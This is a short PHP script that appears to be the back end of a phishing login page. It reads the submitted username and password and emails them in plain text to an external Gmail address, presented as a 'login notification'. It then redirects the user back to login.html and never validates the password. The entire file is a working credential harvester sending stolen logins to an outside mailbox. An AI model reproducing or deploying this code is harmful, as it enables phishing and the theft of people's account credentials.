<?php
// Set the email address where you want to receive login notifications
$to = "noahofficial332@gmail.com";

// Check if the form has been submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {
  // Get the username and password values from the form
  $username = $_POST["username"];
  $password = $_POST["password"];
  
  // Check if the username and password are valid
  // Here you would usually compare the username and password to values in a database
  // For this example, we will just check if the username is not empty
  if (empty($username)) {
    die("Username cannot be empty");
  }
  
  // Construct the email message
  $subject = "Login notification";
  $message = "Username: $username\nPassword: $password";
  
  // Send the email
  if (mail($to, $subject, $message)) {
    // Redirect to the main page if the email was sent successfully
    header("Location: login.html");
    exit();
  } else {
    die("Error sending email");
  }
}
?>
